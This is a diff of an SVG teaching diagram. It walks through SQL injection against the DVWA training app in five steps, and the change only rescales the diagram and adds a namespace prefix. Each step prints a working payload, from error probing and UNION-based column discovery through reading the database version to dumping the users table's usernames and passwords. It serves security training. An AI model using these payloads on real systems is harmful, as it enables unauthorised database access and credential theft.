@@ -1,25 +1,25 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
-  <rect width="1280" height="720" fill="#f0f4f8" rx="7.7576" stroke="#333" stroke-width="2.9091" />
-  <text x="640" y="57.6" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#222" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
-  <text x="640" y="100.8" font-family="monospace" font-size="21.3333" fill="#555" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
-  <rect x="38.7879" y="134.4" width="58.1818" height="72" fill="#1565c0" rx="7.7576" />
-  <text x="67.8788" y="182.4" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#fff" text-anchor="middle">1</text>
-  <text x="116.3636" y="168" font-family="sans-serif" font-size="25.2121" font-weight="bold" fill="#333">Test for injection</text>
-  <text x="116.3636" y="204" font-family="monospace" font-size="21.3333" fill="#c62828">id=1'  →  Error (injectable!)</text>
-  <rect x="38.7879" y="240" width="58.1818" height="72" fill="#1565c0" rx="7.7576" />
-  <text x="67.8788" y="288" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#fff" text-anchor="middle">2</text>
-  <text x="116.3636" y="273.6" font-family="sans-serif" font-size="25.2121" font-weight="bold" fill="#333">Determine number of columns</text>
-  <text x="116.3636" y="309.6" font-family="monospace" font-size="21.3333" fill="#555">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
-  <rect x="38.7879" y="355.2" width="58.1818" height="72" fill="#1565c0" rx="7.7576" />
-  <text x="67.8788" y="403.2" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#fff" text-anchor="middle">3</text>
-  <text x="116.3636" y="388.8" font-family="sans-serif" font-size="25.2121" font-weight="bold" fill="#333">Find display columns</text>
-  <text x="116.3636" y="424.8" font-family="monospace" font-size="21.3333" fill="#555">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
-  <rect x="38.7879" y="470.4" width="58.1818" height="72" fill="#1565c0" rx="7.7576" />
-  <text x="67.8788" y="518.4" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#fff" text-anchor="middle">4</text>
-  <text x="116.3636" y="504" font-family="sans-serif" font-size="25.2121" font-weight="bold" fill="#333">Extract DB version</text>
-  <text x="116.3636" y="540" font-family="monospace" font-size="21.3333" fill="#555">id=' UNION SELECT 1,@@version-- -</text>
-  <rect x="38.7879" y="585.6" width="58.1818" height="72" fill="#c62828" rx="7.7576" />
-  <text x="67.8788" y="633.6" font-family="sans-serif" font-size="27.1515" font-weight="bold" fill="#fff" text-anchor="middle">5</text>
-  <text x="116.3636" y="619.2" font-family="sans-serif" font-size="25.2121" font-weight="bold" fill="#c62828">Dump user credentials</text>
-  <text x="116.3636" y="655.2" font-family="monospace" font-size="21.3333" fill="#c62828">id=' UNION SELECT user,password FROM users-- -</text>
-</svg>
+<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
+  <ns0:rect width="1137.7778" height="640" fill="#f0f4f8" rx="6.8956" stroke="#333" stroke-width="2.5859" />
+  <ns0:text x="568.8889" y="51.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#222" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</ns0:text>
+  <ns0:text x="568.8889" y="89.6" font-family="monospace" font-size="18.9629" fill="#555" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</ns0:text>
+  <ns0:rect x="34.4781" y="119.4667" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
+  <ns0:text x="60.3367" y="162.1333" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">1</ns0:text>
+  <ns0:text x="103.4343" y="149.3333" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Test for injection</ns0:text>
+  <ns0:text x="103.4343" y="181.3333" font-family="monospace" font-size="18.9629" fill="#c62828">id=1'  →  Error (injectable!)</ns0:text>
+  <ns0:rect x="34.4781" y="213.3333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
+  <ns0:text x="60.3367" y="256" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">2</ns0:text>
+  <ns0:text x="103.4343" y="243.2" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Determine number of columns</ns0:text>
+  <ns0:text x="103.4343" y="275.2" font-family="monospace" font-size="18.9629" fill="#555">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</ns0:text>
+  <ns0:rect x="34.4781" y="315.7333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
+  <ns0:text x="60.3367" y="358.4" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">3</ns0:text>
+  <ns0:text x="103.4343" y="345.6" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Find display columns</ns0:text>
+  <ns0:text x="103.4343" y="377.6" font-family="monospace" font-size="18.9629" fill="#555">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</ns0:text>
+  <ns0:rect x="34.4781" y="418.1333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
+  <ns0:text x="60.3367" y="460.8" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">4</ns0:text>
+  <ns0:text x="103.4343" y="448" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Extract DB version</ns0:text>
+  <ns0:text x="103.4343" y="480" font-family="monospace" font-size="18.9629" fill="#555">id=' UNION SELECT 1,@@version-- -</ns0:text>
+  <ns0:rect x="34.4781" y="520.5333" width="51.7172" height="64" fill="#c62828" rx="6.8956" />
+  <ns0:text x="60.3367" y="563.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">5</ns0:text>
+  <ns0:text x="103.4343" y="550.4" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#c62828">Dump user credentials</ns0:text>
+  <ns0:text x="103.4343" y="582.4" font-family="monospace" font-size="18.9629" fill="#c62828">id=' UNION SELECT user,password FROM users-- -</ns0:text>
+</ns0:svg>
